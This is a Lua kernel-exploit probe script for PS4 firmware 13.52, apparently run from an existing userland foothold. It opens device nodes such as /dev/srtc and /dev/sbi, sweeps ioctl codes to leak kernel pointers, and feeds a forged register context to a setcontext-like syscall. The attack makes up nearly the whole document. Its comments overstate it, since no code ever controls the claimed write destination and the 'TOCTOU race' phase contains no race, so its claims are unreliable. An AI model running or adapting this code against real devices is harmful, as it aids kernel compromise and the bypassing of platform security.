------------------------------------------------------------
PS4 FW 13.52 - /dev/srtc WRITE-WHAT-WHERE EXPLOIT
Target: fcn.00021a90 in libkernel.bin

Vulnerability: User's first argument (r14) is a destination pointer
with no validation. When ioctl(fd, 0x40105303, stack_buf) succeeds,
8 bytes of kernel data are written to [r14].

If r14 points to user-controlled memory, we get an arbitrary write.
If r14 points to a userland buffer, we can leak kernel data by
placing the destination in a readable location.

Attack Strategy:
  1. Open /dev/srtc
  2. Set r14 to point to our buffer
  3. Call ioctl(fd, 0x40105303, our_buffer)
  4. Kernel writes 8 bytes to our_buffer
  5. Read back the data for kernel pointer leak

Status: Requires /dev/srtc access (may be sandboxed)
------------------------------------------------------------

function read_qw(addr)
  local b0 = memory.read_byte(addr)
  local b1 = memory.read_byte(addr + 1)
  local b2 = memory.read_byte(addr + 2)
  local b3 = memory.read_byte(addr + 3)
  local b4 = memory.read_byte(addr + 4)
  local b5 = memory.read_byte(addr + 5)
  local b6 = memory.read_byte(addr + 6)
  local b7 = memory.read_byte(addr + 7)
  return b0 + b1*256 + b2*65536 + b3*16777216 + b4*4294967296 + b5*1099511627776 + b6*281474976710656 + b7*72057594037927936
end

local function s(n, a1, a2, a3, a4, a5, a6)
  local stub = syscall_stub[n]
  if not stub then stub = syscall_stub[675] end
  return native.fcall_with_rax(stub + 10, n, a1 or 0, a2 or 0, a3 or 0, a4 or 0, a5 or 0, a6 or 0)
end

------------------------------------------------------------
-- PHASE 1: Open /dev/srtc
------------------------------------------------------------
function phase1_open_srtc()
  print("\n=== PHASE 1: Open /dev/srtc ===")

  -- Try to open /dev/srtc
  local path = "/dev/srtc"
  local path_buf = memory.alloc(64)
  for i = 1, #path do
    memory.write_byte(path_buf + i - 1, string.byte(path, i))
  end
  memory.write_byte(path_buf + #path, 0)

  local fd = s(5, path_buf, 0, 0)  -- open()
  print(string.format("  open('/dev/srtc') = %d", fd))

  if fd < 0 or fd >= 1024 then
    print("  /dev/srtc not accessible (sandboxed)")
    return nil
  end

  return fd
end

------------------------------------------------------------
-- PHASE 2: Test write-what-where
------------------------------------------------------------
function phase2_write_what_where(fd)
  print("\n=== PHASE 2: Write-What-Where Test ===")

  -- Allocate destination buffer (will receive kernel write)
  local dest = memory.alloc(4096)
  for i = 0, 4095 do memory.write_byte(dest + i, 0) end

  -- Fill with marker pattern
  for i = 0, 15 do
    memory.write_byte(dest + i, 0xAA)
  end

  -- Prepare ioctl argument (stack buffer for 0x40105303)
  local ioctl_buf = memory.alloc(64)
  for i = 0, 63 do memory.write_byte(ioctl_buf + i, 0) end
  memory.write_qword(ioctl_buf, 0x1234567890ABCDEF)  -- test value

  -- Call the vulnerable ioctl
  -- fcn.00021a90 uses: ioctl(fd, 0x40105303, stack_buf)
  -- r14 = user's first argument = destination pointer
  -- If we can control r14, kernel writes 8 bytes to [r14]

  print("  Attempting ioctl 0x40105303 on /dev/srtc...")

  -- Method 1: Direct ioctl call
  local r = s(54, fd, 0x40105303, ioctl_buf)  -- ioctl()
  print(string.format("  ioctl() returned: %d", r))

  if r == 0 then
    -- Check if dest buffer was modified
    local modified = false
    for i = 0, 15 do
      if memory.read_byte(dest + i) ~= 0xAA then
        modified = true
        break
      end
    end

    if modified then
      print("  *** DESTINATION BUFFER MODIFIED! ***")
      for i = 0, 15 do
        print(string.format("    dest[%d] = 0x%02x", i, memory.read_byte(dest + i)))
      end
    else
      print("  Destination not modified")
    end

    -- Check ioctl_buf for kernel data
    local has_kernel_data = false
    for i = 0, 7 do
      local val = read_qw(ioctl_buf + i * 8)
      if val >= 0xFFFFFFFF80000000 and val <= 0xFFFFFFFFFFFFFFFF then
        print(string.format("  *** KERNEL PTR in ioctl_buf[%d]: 0x%x ***", i, val))
        has_kernel_data = true
      end
    end
  end

  -- Method 2: Try to control destination pointer
  -- The vulnerability is in how r14 is set from user argument
  -- Try calling with different argument patterns

  print("\n  Testing different argument patterns...")

  -- Pattern 1: dest as first argument
  r = s(54, fd, 0x40105303, dest)
  print(string.format("  ioctl(dest) returned: %d", r))
  if r == 0 then
    local val = read_qw(dest)
    print(string.format("  dest[0] = 0x%x", val))
    if val >= 0xFFFFFFFF80000000 then
      print("  *** KERNEL POINTER LEAKED! ***")
    end
  end

  -- Pattern 2: Try different ioctl request codes
  local ioctl_requests = {
    0x40105303,  -- Original
    0x80105303,  -- Different direction
    0xC0105303,  -- RW direction
    0x40085303,  -- Smaller size
    0x40185303,  -- Larger size
    0x5303,      -- No direction bits
  }

  for _, req in ipairs(ioctl_requests) do
    for i = 0, 63 do memory.write_byte(ioctl_buf + i, 0) end
    r = s(54, fd, req, ioctl_buf)
    if r == 0 then
      print(string.format("  ioctl(0x%x) succeeded!", req))
      for i = 0, 7 do
        local val = read_qw(ioctl_buf + i * 8)
        if val ~= 0 then
          print(string.format("    buf[%d] = 0x%x", i, val))
        end
      end
    end
  end

  return r
end

------------------------------------------------------------
-- PHASE 3: TOCTOU race on /dev/sbi
------------------------------------------------------------
function phase3_sbi_toctou()
  print("\n=== PHASE 3: /dev/sbi TOCTOU ===")

  -- Open /dev/sbi
  local path = "/dev/sbi"
  local path_buf = memory.alloc(64)
  for i = 1, #path do
    memory.write_byte(path_buf + i - 1, string.byte(path, i))
  end
  memory.write_byte(path_buf + #path, 0)

  local fd = s(5, path_buf, 0, 0)
  print(string.format("  open('/dev/sbi') = %d", fd))

  if fd < 0 or fd >= 1024 then
    print("  /dev/sbi not accessible")
    return false
  end

  -- Allocate buffer that we'll race
  local race_buf = memory.alloc(4096)
  for i = 0, 4095 do memory.write_byte(race_buf + i, 0) end

  -- Pattern 1: Normal call
  memory.write_qword(race_buf, 0x4141414141414141)
  local r = s(54, fd, 0xc008a801, race_buf)
  print(string.format("  ioctl(0xc008a801) normal: ret=%d", r))

  if r == 0 then
    local val = read_qw(race_buf)
    print(string.format("  buf[0] = 0x%x", val))
    if val >= 0xFFFFFFFF80000000 then
      print("  *** KERNEL POINTER IN BUFFER! ***")
    end
  end

  -- Pattern 2: Try different ioctl codes
  local sbi_requests = {
    0xc008a801, 0xc010a801, 0xc020a801,
    0x8008a801, 0x8010a801, 0x8020a801,
    0xc008a802, 0xc010a802, 0xc020a802,
    0x4008a801, 0x4010a801, 0x4020a801,
  }

  for _, req in ipairs(sbi_requests) do
    for i = 0, 63 do memory.write_byte(race_buf + i, 0) end
    r = s(54, fd, req, race_buf)
    if r == 0 then
      print(string.format("  ioctl(0x%x) succeeded!", req))
      for i = 0, 7 do
        local val = read_qw(race_buf + i * 8)
        if val ~= 0 then
          print(string.format("    buf[%d] = 0x%x", i, val))
        end
      end
    end
  end

  s(6, fd)
  return true
end

------------------------------------------------------------
-- PHASE 4: Context restore primitive test
------------------------------------------------------------
function phase4_context_restore()
  print("\n=== PHASE 4: Context Restore Primitive ===")
  print("syscall 0x1a7 (423) has setcontext/swapcontext behavior")
  print("Reads full register context from user-controlled structure")

  -- Allocate context structure
  local ctx = memory.alloc(512)
  for i = 0, 511 do memory.write_byte(ctx + i, 0) end

  -- Set up valid-looking context
  memory.write_qword(ctx + 0x00, 1)      -- rdi
  memory.write_qword(ctx + 0x08, 2)      -- rsi
  memory.write_qword(ctx + 0x10, 3)      -- rdx
  memory.write_qword(ctx + 0x18, 4)      -- rcx
  memory.write_qword(ctx + 0x20, 5)      -- r8
  memory.write_qword(ctx + 0x28, 6)      -- r9
  memory.write_qword(ctx + 0x30, 0x100)  -- rax
  memory.write_qword(ctx + 0x38, 0x200)  -- rbx
  memory.write_qword(ctx + 0x40, 0x300)  -- rbp
  memory.write_qword(ctx + 0x48, 0x400)  -- r12
  memory.write_qword(ctx + 0x50, 0x500)  -- r13
  memory.write_qword(ctx + 0x58, 0x600)  -- r14
  memory.write_qword(ctx + 0x60, 0x700)  -- r15
  memory.write_qword(ctx + 0x68, 0x800)  -- rsp
  memory.write_qword(ctx + 0xe0, 0x900)  -- return address

  -- Magic values for FPU restore
  memory.write_dword(ctx + 0x100, 0x20001)
  memory.write_dword(ctx + 0x104, 0x10002)

  -- Fill FPU state area with recognizable pattern
  for i = 0, 511 do
    memory.write_byte(ctx + 0x120 + i, 0xCC)
  end

  print("  Attempting syscall 423 (setcontext)...")

  -- This will likely crash if it works (restores our registers)
  -- But we want to see if it accepts our context structure
  local r = s(423, ctx, 0, 0, 0, 0)
  print(string.format("  syscall 423 returned: 0x%x", r))

  -- If we get here, check if registers were modified
  -- (They shouldn't be unless setcontext actually executed)
  print("  (If we reach here, setcontext did not execute)")
  print("  Context structure is at: " .. string.format("0x%x", ctx))
end

------------------------------------------------------------
-- PHASE 5: ioctl 0xa802 leak test
------------------------------------------------------------
function phase5_ioctl_a802_leak()
  print("\n=== PHASE 5: ioctl 0xa802 Leak ===")
  print("Function 0x19e80 is the ONLY ioctl that returns stack data without zeroing")

  -- Try to open device that supports ioctl 0xa802
  local devices = {
    "/dev/sbi",
    "/dev/srtc",
    "/dev/dce",
    "/dev/dmem0",
    "/dev/gbase",
    "/dev/dipsw",
  }

  for _, dev_path in ipairs(devices) do
    local path_buf = memory.alloc(64)
    for i = 1, #dev_path do
      memory.write_byte(path_buf + i - 1, string.byte(dev_path, i))
    end
    memory.write_byte(path_buf + #dev_path, 0)

    local fd = s(5, path_buf, 0, 0)
    if fd >= 0 and fd < 1024 then
      print(string.format("  Opened %s (fd=%d)", dev_path, fd))

      -- Try ioctl 0xc010a802 (RW, 16 bytes)
      local buf = memory.alloc(64)
      for i = 0, 63 do memory.write_byte(buf + i, 0) end

      -- Fill with pattern to detect kernel modification
      for i = 0, 15 do
        memory.write_byte(buf + i, 0x41 + i)
      end

      local r = s(54, fd, 0xc010a802, buf)
      if r == 0 then
        print(string.format("    ioctl(0xc010a802) succeeded!"))
        print("    Buffer contents (checking for kernel modification):")
        local modified = false
        for i = 0, 15 do
          local expected = 0x41 + i
          local actual = memory.read_byte(buf + i)
          if actual ~= expected then
            modified = true
          end
          print(string.format("      [%d] expected=0x%02x actual=0x%02x", i, expected, actual))
        end
        if modified then
          print("    *** BUFFER WAS MODIFIED BY KERNEL! ***")
          -- Check for kernel pointers
          for i = 0, 7 do
            local val = read_qw(buf + i * 8)
            if val >= 0xFFFFFFFF80000000 then
              print(string.format("    *** KERNEL PTR at offset %d: 0x%x ***", i * 8, val))
            end
          end
        end
      end

      s(6, fd)
    end
  end
end

------------------------------------------------------------
-- MAIN
------------------------------------------------------------
print("============================================")
print("PS4 FW 13.52 - /dev/srtc W^W EXPLOIT")
print("============================================")

-- Phase 1: Open /dev/srtc
local srtc_fd = phase1_open_srtc()

-- Phase 2: Test write-what-where
if srtc_fd then
  phase2_write_what_where(srtc_fd)
  s(6, srtc_fd)
end

-- Phase 3: TOCTOU race
phase3_sbi_toctou()

-- Phase 4: Context restore (may crash)
phase4_context_restore()

-- Phase 5: ioctl 0xa802 leak
phase5_ioctl_a802_leak()

print("\n============================================")
print("COMPLETE - Report results from PS4")
print("============================================")
